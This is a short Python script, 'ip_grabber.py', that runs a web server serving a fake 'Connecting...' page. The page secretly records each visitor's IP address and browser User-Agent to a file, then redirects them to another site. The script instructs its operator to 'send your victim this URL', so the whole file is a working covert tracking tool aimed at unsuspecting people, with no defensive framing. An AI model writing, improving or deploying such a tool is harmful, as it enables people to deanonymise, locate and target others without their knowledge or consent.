# ip_grabber.py
import http.server
import socketserver
import threading
import os
import settings

PORT = 8080
LOG_FILE = "grabbed_ips.txt"
FAKE_PAGE = """
<html>
<head><title>Loading...</title></head>
<body>
<h1>Connecting...</h1>
<script>setTimeout(function(){ window.location.href = 'https://masan.tools'; }, 1000);</script>
</body>
</html>
"""

class IPLoggerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent')

        with open(LOG_FILE, "a") as f:
            f.write(f"IP: {client_ip} | UA: {user_agent}\n")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(FAKE_PAGE.encode('utf-8'))

def start_server():
    print(f"{settings.COLOR_CYAN}[~] IP Grabber running on port {PORT}...{settings.COLOR_END}")
    Handler = IPLoggerHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        httpd.serve_forever()

def launch_ip_grabber():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    server_thread = threading.Thread(target=start_server)
    server_thread.start()
    print(f"{settings.COLOR_YELLOW}[i] Send your victim this URL: http://YOUR_IP:{PORT}{settings.COLOR_END}")

if __name__ == "__main__":
    launch_ip_grabber()
